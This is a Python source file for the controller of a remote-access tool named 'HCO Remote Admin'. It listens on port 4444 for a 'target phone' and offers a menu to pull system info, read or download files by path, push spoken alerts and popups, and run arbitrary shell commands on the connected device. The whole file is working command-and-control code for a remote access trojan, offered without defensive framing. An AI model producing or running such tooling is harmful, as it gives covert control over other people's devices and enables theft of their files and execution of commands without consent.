import socket

def show_menu():
    print("""
    =========================================
       HCO REMOTE ADMIN - COMMAND CONTROL    
    =========================================
    [1] Get Target System Info (SysInfo)
    [2] Send Voice Alert (Text-to-Speech)
    [3] Download/Read File From Target
    [4] Push Auto-Note / Popup Text on Screen
    [5] Execute Custom Shell Command
    [6] Exit Session
    =========================================
    """)

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(('0.0.0.0', 4444))
    server.listen(1)
    print("[*] HCO Advanced Server Started on port 4444...")
    print("[*] Waiting for target phone connection...")
    
    conn, addr = server.accept()
    print(f"\n[+] SUCCESS: Connection established from target: {addr}\n")
    
    while True:
        show_menu()
        choice = input("HCO-ControlCenter> ").strip()
        
        if choice == '1':
            conn.send(b'sysinfo')
            print("\n[*] Fetching device specs...")
            output = conn.recv(4096).decode()
            print(f"\n--- TARGET DEVICE INFO ---\n{output}\n--------------------------")
            
        elif choice == '2':
            msg = input("[?] Enter text message to speak on target phone: ")
            conn.send(f"alert:{msg}".encode())
            output = conn.recv(1024).decode()
            print(f"\n[+] {output}")
            
        elif choice == '3':
            file_path = input("[?] Enter full path of file to download/read: ")
            conn.send(f"download:{file_path}".encode())
            output = conn.recv(4096).decode()
            print(f"\n--- FILE CONTENT ---\n{output}\n--------------------")
            
        elif choice == '4':
            note_text = input("[?] Enter the text/note you want to pop up on target screen: ")
            conn.send(f"popup:{note_text}".encode())
            output = conn.recv(1024).decode()
            print(f"\n[+] {output}")
            
        elif choice == '5':
            cmd = input("HCO-Shell> ")
            if cmd.strip() == "": continue
            conn.send(f"cmd:{cmd}".encode())
            output = conn.recv(4096).decode()
            print(f"\n--- OUTPUT ---\n{output}\n--------------")
            
        elif choice == '6':
            conn.send(b'exit')
            print("[*] Closing connection securely.")
            break
        else:
            print("[-] Invalid Choice!")
            
    conn.close()
    server.close()

if __name__ == "__main__":
    start_server()
